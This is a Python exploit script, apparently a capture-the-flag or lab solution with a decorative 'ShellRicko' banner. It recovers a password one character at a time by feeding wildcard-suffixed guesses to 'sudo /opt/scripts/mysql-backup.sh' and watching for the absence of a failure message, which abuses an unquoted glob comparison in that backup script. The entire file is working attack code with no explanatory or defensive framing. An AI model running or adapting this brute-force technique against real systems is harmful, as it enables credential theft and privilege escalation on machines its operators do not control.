#!/bin/python3

import subprocess
import signal
import sys

def ctrl_C(sig, frame):
        print("\n\n\nProcess Interrumpted")
        sys.exit(0)

signal.signal(signal.SIGINT, ctrl_C)

def password_Guess():
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        password = ''
        passlen = 0

        while passlen < 32:
                for char in chars:
                        command = 'echo ' + password + char + '* | sudo /opt/scripts/mysql-backup.sh'
                        response = subprocess.run(command, shell=True, capture_output=True, text=True)

                        if 'Password confirmation failed!' not in response.stdout:
                                password = password + char
                                #print(password)
                                break

                passlen = passlen + 1

        print(f"\033[1;31;40m Possible Password Found: \033 \033 [1;36;40m {password}\033 \033 [1;37;40m")

def banner():
        shellricko = '''
        \033[1;36;40m  =======  \033 ||   || \033  \033  \033  =======  \033 \033 ||       \033 \033 ||       \033  \033 =======     \033  \033 ========  \033  \033    =======  \033  \033 ||   //    \033  \033   =====
        \033[1;36;40m ((        \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033 ||      ))   \033  \033    ||     \033  \033  ((         \033  \033 ||  //     \033  \033 ||     ||
        \033[1;36;40m ((        \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033 ||       ))  \033  \033    ||     \033  \033  ((         \033  \033 || //      \033  \033 ||     ||
        \033[1;36;40m   =====   \033  )===(  \033  \033  \033   ====    \033 \033 ||       \033 \033 ||      \033  \033 ||      ))   \033  \033    ||     \033  \033  ((         \033  \033 ||((       \033  \033 ||     ||
        \033[1;36;40m        )) \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033  =====((     \033  \033    ||     \033  \033  ((         \033  \033 || \\\\      \033  \033 ||     ||
        \033[1;36;40m        )) \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033 ||     \\\   \033  \033     ||     \033  \033  ((        \033  \033  ||  \\\\     \033  \033 ||     ||
        \033[1;36;40m  =======  \033 ||   || \033  \033  \033  =======  \033 \033  ======= \033 \033  =======\033  \033 ||      \\\  \033  \033  ========  \033  \033    ======= \033  \033  ||   \\\\    \033  \033   =====
        '''
        return shellricko

if __name__ == '__main__':
        banner = banner()
        print(banner)
        password_Guess()
        print("\n\n\n\n")
